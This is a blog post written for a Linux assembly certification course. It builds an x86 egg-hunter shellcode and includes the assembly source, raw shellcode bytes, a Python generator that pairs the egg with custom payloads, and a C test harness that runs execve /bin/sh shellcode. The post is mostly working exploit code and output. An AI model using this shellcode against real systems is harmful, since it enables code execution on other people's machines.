---
layout: post
title: "SLAE Assignment #3 | Egg Hunter"
date: 2018-01-26
comments: true
categories:
---

Assignment #3 in the [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) exam is to create an egg hunter with configurable payload.

References:
* [http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

In the paper above the following technique is shown and implemented in different ways:

```
egg = 0x1337

for page in memory:
  if access(page) == valid:
    for address in page:
      if memory[address] == egg and 
         memory[address+4] == egg:
         jmp memory+8
```

So how do we do this?

System call [int access(const char *pathname, int mode);](http://man7.org/linux/man-pages/man2/access.2.html) will be used.

* System call number is `0x21`
* pathname will be the beginning of the page-aligned address, according to the paper the page size used is 4096, so by doing the operation `(address OR 0xfff + 1)` we can align with the next page.
* mode will be the file rights we want to use, we want at least write and execute, which is `0x5` (had to compile a program and run `printf("%x", R_OK|X_OK)` to check), in the end it was fine to pass `0` as argument.
* Return value is `0` if the address is valid, and `0xf2` if EFAULT.

With this I feel ready to write the code.

After quite a lot of trial and error I came up with the following code:

```
section .text
  global _start

_start:
  xor ebx, ebx
  xor ecx, ecx

next_page:
  or dx, 0xFFF

next_address:
  inc edx

  ;access call
  ;mov cl, 0x5, seems to work okay keeping it as null 
  lea ebx, [edx+4] ; using +4 which ensures check of ebx - ebx +8 to be valid
  push 0x21
  pop eax
  int 0x80
  cmp al, 0xf2
  je next_page

  mov eax, 0x11223344
  mov edi, edx
  scasd
  jne next_address
  scasd
  jne next_address

  jmp edi
```

I exported the hunter shellcode:
```
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-3$ ../tools/compile.sh egg-hunter && ../tools/format_shellcode.py egg-hunter
Done
Python style shellcode:
"\x31\xdb\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x44\x33\x22\x11\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
```

Then I implemented the script that makes it possible to use custom payloads and configure egg-values:

```python
#!/usr/bin/python

original_hunter ="\\x31\\xdb\\x31\\xc9\\x66\\x81\\xca\\xff\\x0f\\x42" + \
                "\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c\\xf2" + \
                "\\x74\\xee\\xb8\\x44\\x33\\x22\\x11\\x89\\xd7\\xaf" + \
                "\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7"

egg = raw_input("egg value (4 bytes):")[::-1]

if len(egg)!=4:
  print "Invalid egg length"
egg = "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in egg)

hunter_shellcode = original_hunter.replace("\\x44\\x33\\x22\\x11", egg)

shellcode = raw_input("shellcode:")
prepped_shellcode = egg+egg+shellcode

print "Hunter:\n" + hunter_shellcode


print "Shellcode:\n"+prepped_shellcode
```

Using it by providing egg value and shellcode(in this case exec bin sh):

```
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-3$ python egg_generator.py 
egg value (4 bytes):1234
shellcode:\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
Hunter:
\x31\xdb\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x34\x33\x32\x31\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7
Shellcode:
\x34\x33\x32\x31\x34\x33\x32\x31\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

I then verified that it works in the following C-program:

```
#include <unistd.h>
#include <stdio.h>

unsigned char hunter [] = \
"\x31\xdb\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a"
"\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x34"
"\x33\x32\x31\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
unsigned char egg [] = \
"\x34\x33\x32\x31\x34\x33\x32\x31\x31\xc0\x50\x68"
"\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62"
"\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
  printf("Shellcode Length: %d\n", strlen(hunter));
  int (*ret)() = (int(*)())hunter;
  ret();
}
```

Compiling and running:

```
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-3$ gcc test.c -o test  -fno-stack-protector -z execstack -no-pie --std=c99
...some compiler warnings...
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-3$ ./test
Shellcode Length: 37
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-3$ 
```

Quite fun assignment with lots of debugging.


---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 569

